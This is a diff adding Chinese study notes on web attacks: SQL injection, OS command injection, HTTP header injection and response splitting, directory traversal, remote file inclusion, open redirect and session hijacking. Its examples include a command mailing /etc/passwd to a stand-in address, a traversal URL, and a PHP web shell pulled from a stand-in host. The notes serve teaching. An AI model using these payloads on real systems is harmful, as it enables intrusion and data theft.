@@ -105,6 +105,93 @@
           document.write("&lt;");
         </pre>
         <p>在存在可跨站脚本攻击安全漏洞的Web 应用上执行上面这段JavaScript 程序，即可访问到该Web 应用所处域名下的Cookie 信息。然后这些信息会发送至攻击者的Web网站（http://hackr.jp/），记录在他的登录日志中。结果，攻击者就这样窃取到用户的Cookie 信息了。</p>
+        <h5>其他攻击技术</h5>
+        <p>SQL注入：SQL注入（SQLInjection）是指针对Web应用使用的数据库，通过运行非法的SQL而产生的攻击。该安全隐患有可能引发极大的威胁，有时会直接导致个人信息及机密信息的泄露。Web 应用通常都会用到数据库，当需要对数据库表内的数据进行检索或添加、删除等操作时，会使用SQL 语句连接数据库进行特定的操作。如果在调用SQL 语句的方式上存在疏漏，就有可能执行被恶意注入（Injection）非法SQL 语句。SQL 注入攻击有可能会造成以下等影响。</p>
+        <p>
+          非法查看或篡改数据库内的数据
+          <br/>规避认证
+          <br/>执行和数据库服务器业务关联的程序等
+        </p>
+        <p>下面是一个例子：正常搜索：从bookTbl表中，显示满足author= 上野宣 and flag=1（可售）所在行的数据,URL 的查询字段已指定q= 上野宣，这个值由Web 应用传入到
+SQL 语句中，构成下方的SQL语句。数据库内的bookTbl表记录着该购物网站的所有书籍信息。通过SQL语句，将满足作者名（author）上野宣并且flag为1的双重条件的条目取出，最后作为搜索结果显示出来。</p>
+        <pre>SELECT * FROM bookTbl WHERE author = ' 上野宣' and flag = 1;</pre>
+        <p>注入实例：把刚才指定查询字段的上野宣改写成“上野宣'--”。</p>
+        <pre>SELECT * FROM bookTbl WHERE author =' 上野宣' --' and flag = 1;</pre>
+        <p>从bookTbl表内显示满足“author=上野宣”这个条件的所在行数据（-- 之后的内容会自动判为注释，因此flag=1这个条件就被直接忽略了）.SQL 语句中的--之后全视为注释。即，andflag=1这个条件被自动忽略了。结果跟flag的设定值无关，只取出满足author=“上野宣”条件所在行的数据，这样连那些尚未出版的书籍也一并显示出来了</p>
+        <p>OS注入攻击：以咨询表单的发送功能为例，说说OS 注入攻击。该功能可将用户的咨询邮件按已填写的对方邮箱地址发送过去。下面为处理该表单内容的一部分核心代码</p>
+        <pre>
+          my $adr = $q->param('mailaddress');
+          open(MAIL, "¦ /usr/sbin/sendmail $adr");
+          print MAIL "From: info@example.com\n";
+        </pre>
+        <p>程序中的open 函数会调用sendmail 命令发送邮件，而指定的邮件发送地址即$adr 的值。攻击者将下面的值指定作为邮件地址。</p>
+        <pre>
+          ; cat /etc/passwd ¦ mail hack@example.jp
+        </pre>
+        <p>程序接收该值，构成以下的命令组合。</p>
+        <pre>
+          ¦ /usr/sbin/sendmail ; cat /etc/passwd ¦ mail hack@example.jp
+        </pre>
+        <p>攻击者的输入值中含有分号（;）。这个符号在OS 命令中，会被解析为分隔多个执行命令的标记。可见，sendmail 命令执行被分隔后，接下去就会执行cat /etc/passwd
+| mail hack@example.jp 这样的命令了。结果，含有Linux 账户信息/etc/passwd 的文件，就以邮件形式发送给了hack@example.jp。</p>
+        <p>HTTP 首部注入攻击:HTTP 首部注入攻击（HTTP Header Injection）是指攻击者通过在响应首部字段内插入换行，添加任意响应首部或主体的一种攻击。属于被动攻击模式。
+向首部主体内添加内容的攻击称为HTTP 响应截断攻击（HTTP Response Splitting Attack）。如下所示，Web 应用有时会把从外部接收到的数值，赋给响应首部字段Location 和Set-Cookie。</p>
+        <pre>
+          Location: http://www.example.com/a.cgi?q=12345
+          Set-Cookie: UID=12345
+          ＊12345就是插入值
+        </pre>
+        <p>HTTP 首部注入可能像这样，通过在某些响应首部字段需要处理输出值的地方，插入换行发动攻击。HTTP 首部注入攻击有可能会造成以下一些影响。</p>
+        <p>设置任何Cookie信息
+          <br/>重定向至任意URL
+          <br/>显示任意的主体（HTTP响应截断攻击）</p>
+        <p>下面以选定某个类别后即可跳转至各类别对应页面的功能为例，说说HTTP 首部注入攻击。该功能为每个类别都设定了一个类别ID 值，一旦选定某类别，就会将该ID 值反映在响应内的Location 首部字段内，形如Location: http://example.com/?cat=101。令浏览器发生重定向跳转。攻击者以下面的内容替代之前的类别ID 后发送请求：</p>
+        <pre>
+          101%0D%0ASet-Cookie:+SID=123456789
+        </pre>
+        <p>其中，%0D%0A 代表HTTP 报文中的换行符，紧接着的是可强制将攻击者网站（http://hackr.jp/）的会话ID设置成SID=123456789的Set-Cookie首部字段。发送该请求之后，假设结果返回以下响应。</p>
+        <pre>
+          Location: http://example.com/?cat=101（%0D%0A ：换行符）
+          Set-Cookie: SID=123456789
+        </pre>
+        <p>此刻，首部字段Set-Cookie 已生效，因此攻击者可指定修改任意的Cookie 信息。通过和会话固定攻击（攻击者可使用指定的会话ID）攻击组合，攻击者可伪装成用户。攻击者输入的%0D%0A，原本应该属于首部字段Location 的查询值部分，但经过解析后，%0D%0A 变成了换行符，结果插入了新的首部字段。这样一来，攻击者可在响应中插入任意的首部字段。</p>
+        <p>HTTP 响应截断攻击是用在HTTP 首部注入的一种攻击。攻击顺序相同，但是要将两个%0D%0A%0D%0A 并排插入字符串后发送。利用这两个连续的换行就可作出HTTP 首部与主体分隔所需的空行了，这样就能显示伪造的主体，达到攻击目的。这样的攻击叫做HTTP 响应截断攻击。在可能进行HTTP 首部注入的环节，通过发送上面的字符串，返回
+结果得到以下这种响应。</p>
+        <pre>
+          Set-Cookie: UID=（%0D%0A ：换行符）
+         （%0D%0A ：换行符）
+          &lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;之后，想要显示的网页内容 
+          &lt;!--（原来页面对应的首部字段和主体部分全视为注释）
+        </pre>
+        <p>利用这个攻击，已触发陷阱的用户浏览器会显示伪造的Web 页面，再让用户输入自己的个人信息等，可达到和跨站脚本攻击相同的效果。另外，滥用HTTP/1.1 中汇集多响应返回功能，会导致缓存服务器对任意内容进行缓存操作。这种攻击称为缓存污染。使用该缓存服务器的用户，在浏览遭受攻击的网站时，会不断地浏览被替换掉的Web网页。</p>
+        <p>目录遍历攻击是指对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击。通过Web 应用对文件处理操作时，在由外部指定文件名的处理存
+在疏漏的情况下，用户可使用.../ 等相对路径定位到/etc/passed等绝对路径上，因此服务器上任意的文件或文件目录皆有可能被访问到。这样一来，就有可能非法浏览、篡改或删除Web 服务器上的文件。固然存在输出值转义的问题，但更应该关闭指定对任意文件名的访问权限。下面是一个例子</p>
+        <pre>
+          http://example.com/read.php?log=../../etc/passwd
+        </pre>
+        <p>查询字段为了读取攻击者盯上的/etc/passwd 文件，会从/www/log/目录开始定位相对路径。如果这份read.php脚本接受对指定目录的访问请求处理，那原本不公开的文件就存在可被访问的风险。</p>
+        <p>远程文件包含漏洞是指当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的URL 充当依赖文件，让脚本读取之后，就可运行任意脚本的一种攻击。
+这主要是PHP 存在的安全漏洞，对PHP 的include 或require 来说，这是一种可通过设定，指定外部服务器的URL 作为文件名的功能。但是，该功能太危险，PHP5.2.0 之后默认设定此功能无效。固然存在输出值转义的问题，但更应控制对任意文件名的指定。下面是一个例子：</p>
+        <pre>
+          http://example.com/foo.php?mod=news.php
+        </pre>
+        <p>发送这个请求到服务器，对应脚本的源代码如下所示。</p>
+        <pre>
+          $modname = $_GET['mod'];
+          include($modname);
+        </pre>
+        <p>攻击者发请求：http://example.com/foo.php?mod=http://hackr.jp/cmd.php&cmd=ls，并事先准备了http://hackr.jp/cmd.php文件：</p>
+        <pre>
+          &lt;? system($_GET['cmd']) ?&gt;
+        </pre>
+        <p>假设Web 服务器（example.com）的include 可以引入外部服务器URL，那就会读入攻击者在外部服务器上事先准备的URL（http://hackr.jp/cmd.php）。结果， 通过system 函数就能在Web 服务器（example.com）上执行查询字段指定的OS 命令了。</p>
+        <h5>因设置或设计上的缺陷引发的安全漏洞</h5>
+        <p>强制浏览：强制浏览安全漏洞是指，从安置在Web 服务器的公开目录下的文件中，浏览那些原本非自愿公开的文件。</p>
+        <p>不正确的错误消息处理:不正确的错误消息处理的安全漏洞是指，Web 应用的错误信息内包含对攻击者有用的信息。与Web 应用有关的主要错误信息:Web应用抛出的错误消息
+\数据库等系统抛出的错误消息.系统抛出的错误主要集中在:PHP或ASP等脚本错误\数据库或中间件的错误\Web服务器的错误</p>
+        <p>开放重定向是一种对指定的任意URL 作重定向跳转的功能。而于此功能相关联的安全漏洞是指，假如指定的重定向URL 到某个具有恶意的Web 网站，那么用户就会被诱导至那个Web网站。例如：http://example.com/?redirect=http://www.tricorder.jp网站使用这个形式重定向，攻击者把重定向指定的参数改写成已设好陷阱的Web 网站对应的连接，http://example.com/?redirect=http://hackr.jp。用户看到URL 后原以为访问example.com，不料实际上被诱导至hackr.jp 这个指定的重定向目标。</p>
+        <p>会话劫持是指攻击者通过某种手段拿到了用户的会话ID，并非法使用此会话ID 伪装成用户，达到攻击的目的。具备认证功能的Web 应用，使用会话ID的会话管理机制，作为管
+理认证状态的主流方式。会话ID 中记录客户端的Cookie 等信息，服务器端将会话ID 与认证状态进行一对一匹配管理。几种攻击者可获得会话ID 的途径:通过非正规的生成方法推测会话ID\通过窃听或XSS攻击盗取会话ID\通过会话固定攻击（Session Fixation）强行获取会话ID。一个例子：认证功能通过会话管理机制，会将成功认证的用户的会话ID（SID）保存在用户浏览器的Cookie 中。攻击者在得知该Web 网站存在可跨站攻击（XSS）的安全漏洞后，就设置好用JavaScript 脚本调用document.cookie 以窃取Cookie 信息的陷阱，一旦用户踏入陷阱（访问了该脚本），攻击者就能获取含有会话ID 的Cookie。攻击者拿到用户的会话ID 后，往自己的浏览器的Cookie 中设置该会话ID，即可伪装成会话ID 遭窃的用户，访问Web 网站了。</p>
         
 <h3>标签</h3>
 <p>security</p>
